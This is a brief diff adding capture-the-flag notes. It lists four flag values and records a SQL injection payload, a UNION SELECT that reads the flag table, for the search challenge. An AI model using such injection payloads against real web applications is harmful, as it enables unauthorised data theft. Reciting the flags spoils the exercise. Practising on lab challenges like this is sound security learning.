@@ -1,0 +1,7 @@
+ROBOTS flag: fa1eb93add81ef810778a843bee014d6
+
+SEARCH flag: 3686962a34ba2e4c0943547ec3bdb12a write up: fd' union select 1,flag_is from flag #
+
+ADMIN flag: 5fae73b7fc4e2cb5dc58b14662a1d82f
+
+COOKIE flag: 04b7a99762811fe025f20ad4638c9b61
